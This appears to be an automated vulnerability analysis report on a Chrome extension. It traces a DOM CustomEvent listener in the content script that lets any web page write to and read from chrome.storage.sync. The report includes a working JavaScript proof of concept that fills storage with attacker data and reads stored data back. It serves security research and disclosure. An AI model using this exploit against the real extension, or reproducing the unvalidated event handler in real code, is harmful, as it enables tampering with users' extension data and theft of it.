# CoCo Analysis: odgjadfpfckebkfaafjcijaejgdkpfbb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (multiple storage.set operations from same vulnerable flow)

---

## Sink: document_eventListener_neraReqEvent → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/odgjadfpfckebkfaafjcijaejgdkpfbb/opgen_generated_files/cs_0.js
Line 497: document.addEventListener('neraReqEvent', function(event) {
Line 498: messageProcessor(event.detail.cmd, event.detail.param, event.detail.reqId);

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 497-498)
document.addEventListener('neraReqEvent', function(event) {
    messageProcessor(event.detail.cmd, event.detail.param, event.detail.reqId); // ← attacker-controlled
});

// Message processor (cs_0.js Line 501-549)
async function messageProcessor(cmd, param, reqId) {
    switch(cmd) { // ← attacker-controlled cmd
        case 'store_my_fav':
            chrome.storage.sync.set({my_fav: param}); // ← Storage write sink with attacker data
            break;

        case 'store_report':
            chrome.storage.sync.set({ [param.report_id]: { // ← Storage write sink with attacker data
                col_settings: param.col_settings,
                hidden_cols: param.hidden_cols
            }});
            break;

        case 'get_my_fav':
            chrome.storage.sync.get('my_fav', function(result) {
                const response = {reqId: reqId, data: result.my_fav}; // ← Retrieves stored data
                const myEvent = new CustomEvent('neraRespEvent', {"detail":response});
                document.dispatchEvent(myEvent); // ← Sends data back to attacker
            });
            break;

        case 'get_report':
            chrome.storage.sync.get([param], function(result) {
                // Retrieves stored data and sends back via CustomEvent
                const return_data = {
                    col_settings: rep_settings.col_settings,
                    hidden_cols: rep_settings.hidden_cols
                };
                const response = {reqId: reqId, data: return_data};
                const myEvent = new CustomEvent('neraRespEvent', {"detail":response});
                document.dispatchEvent(myEvent); // ← Sends data back to attacker
            });
            break;
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (document.addEventListener)

**Attack:**

```javascript
// Step 1: Attacker poisons storage with malicious data
const poisonEvent = new CustomEvent('neraReqEvent', {
    detail: {
        cmd: 'store_my_fav',
        param: ['malicious_data_1', 'malicious_data_2'],
        reqId: 'attack123'
    }
});
document.dispatchEvent(poisonEvent);

// Step 2: Attacker retrieves the poisoned data
document.addEventListener('neraRespEvent', function(event) {
    if (event.detail.reqId === 'retrieve123') {
        console.log('Stolen data:', event.detail.data); // ← Attacker receives data
    }
});

const retrieveEvent = new CustomEvent('neraReqEvent', {
    detail: {
        cmd: 'get_my_fav',
        param: null,
        reqId: 'retrieve123'
    }
});
document.dispatchEvent(retrieveEvent);

// Alternative: Poison specific report settings
const poisonReport = new CustomEvent('neraReqEvent', {
    detail: {
        cmd: 'store_report',
        param: {
            report_id: 'malicious_report',
            col_settings: 'attacker_controlled_settings',
            hidden_cols: 'attacker_controlled_columns'
        },
        reqId: 'attack456'
    }
});
document.dispatchEvent(poisonReport);
```

**Impact:** Complete storage exploitation chain. Attacker can poison chrome.storage.sync with arbitrary data and retrieve it back, achieving both storage write and read capabilities. This allows the attacker to manipulate extension state and exfiltrate any data stored by legitimate users, including report configurations and favorites lists.
